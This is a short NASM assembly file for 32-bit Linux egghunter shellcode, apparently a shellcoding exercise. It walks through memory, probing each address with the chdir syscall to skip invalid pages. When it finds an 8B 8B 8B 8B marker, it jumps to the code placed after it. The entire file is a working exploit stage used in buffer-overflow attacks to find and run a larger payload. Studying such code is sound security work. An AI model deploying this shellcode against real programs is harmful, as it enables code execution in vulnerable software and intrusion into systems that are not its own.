; egghunter.nasm
; Author: lastlistener
; Purpose: Egghunter shellcode.
; Egg: 8B 8B 8B 8B

global _start

section .text
_start:
	mov edx,0x8b8b8b8a		; edx = egg-1
	inc edx				; edx = egg
	xor ebx,ebx			

new_page:
	or bx,0xfff			; get address of next page with OR against 0xfff

new_byte:
	inc ebx				; ebx = address to examine
	push byte 0xc
	pop eax				; eax = syscall number (12 for chdir)
	int 0x80			; chdir syscall
	cmp al,0xf2			; did the return value indicate an invalid pointer?
	jz new_page			; if so, go to a new page and try to find a valid pointer
	cmp dword [ebx],edx		; is the egg at this memory address?
	jnz new_byte			; if it isn't, go to the next byte
	lea eax,[ebx+4]
	jmp eax				; if it is, execute the code that follows the egg
